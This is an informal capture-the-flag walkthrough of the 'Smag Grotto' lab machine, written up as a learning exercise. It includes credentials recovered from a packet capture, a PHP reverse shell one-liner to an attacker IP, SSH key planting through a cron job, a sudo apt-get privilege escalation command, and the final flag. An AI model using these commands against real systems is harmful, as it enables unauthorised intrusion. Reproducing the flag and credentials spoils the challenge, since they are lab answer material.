# writeups
smag.thm

--nmap info--
```
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
```


users--
Jake
Uzi
NETADMIN

/server-status
/mail

I found a mail dir, really important because it has some indications
or something that help, I found a .pcap file in when I opened it I found
this `username=helpdesk&password=cH4nG3M3_n0w` and this are correct becuase
after I can see the redirection pass with success to this field, `development.smag.thm`. so
why not add that host to our, /etc/hosts, after I did that here a new dir on 
the webapp. Come to the admin panel I used the credentials that I found before to
login and there a panel command, so one thing I noted to this panel, you enter a command
but It doesn't answer but the command succeed, so one thing I did to verify that it by making 
`sudo tcpdump -i tun0 icmp`, on my machine, it's like a bind shell to my machine, so the
panel command gonna get a ping on mine and I'm gonna look if it really works, so it works that mean
the panel are fine,, let's see if a reverse shell works.

`php -r '$sock=fsockopen("10.8.91.36",1234);exec("/bin/sh -i <&3 >&3 2>&3");'` this one works, I reverse shell

here, I try to see home jake directory, but I could't open the *user.txt* because permission, I was 
looking in /opt dir and I found jake id_rsa.pub but that mean I can make an authorized_keys towards my machine
to get into the other, after generate the key and pass the key to the machine, so wait a moment to the cronjob
works and then I get a ssh with jake session.

I come read the user.txt and then check sudo file( sudo -l), I found apt-get with root perm, then go to gtfobins
and I took `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` and I got the root and the last flag is 

`uJr6zRgetaniyHVRqqL58uRasybBKz2T`





This help me alot sometime when I got stucked
https://0xnirvana.gitbook.io/writeups/tryhackme/easy/smag-grotto

email2web software had a bug nonFix
they had to migrate to  192.168.33.0/24 network to the 10.10.0.0/8
